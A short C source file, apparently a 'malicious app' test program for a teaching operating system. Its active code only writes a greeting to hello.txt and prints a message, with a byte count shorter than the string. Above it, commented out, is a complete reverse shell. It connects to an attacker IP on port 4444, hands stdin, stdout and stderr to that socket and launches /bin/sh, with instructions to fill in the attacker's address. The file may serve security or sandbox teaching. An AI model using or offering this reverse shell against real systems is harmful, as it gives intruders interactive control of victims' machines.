// #include <unistd.h>
// #include <arpa/inet.h>
// #include <sys/socket.h>

// #define ATTACKER_IP "10.218.107.109" // Replace with attacker's IP
// #define ATTACKER_PORT 4444 // Replace with attacker's listener port

// int main() {
//     int sock;
//     struct sockaddr_in attacker;

//     sock = socket(AF_INET, SOCK_STREAM, 0);

//     attacker.sin_family = AF_INET;
//     attacker.sin_port = htons(ATTACKER_PORT);
//     attacker.sin_addr.s_addr = inet_addr(ATTACKER_IP);

//     connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

//     // Redirect stdin, stdout, stderr to the socket
//     dup2(sock, 0); // stdin
//     dup2(sock, 1); // stdout
//     dup2(sock, 2); // stderr

//     // Spawn a shell
//     execve("/bin/sh", NULL, NULL);

//     return 0;
// }


#include "user.h"

int main(void) {
    writefile("hello.txt", "Hello from malicious app!\n", 19);
    writefile("hello.txt", "Hello from malicious app!\n", 19);
    writefile("hello.txt", "Hello from malicious app!\n", 19);
    writefile("hello.txt", "Hello from malicious app!\n", 19);
    printf("Hello World from Malicious App!\n");

    exit();
}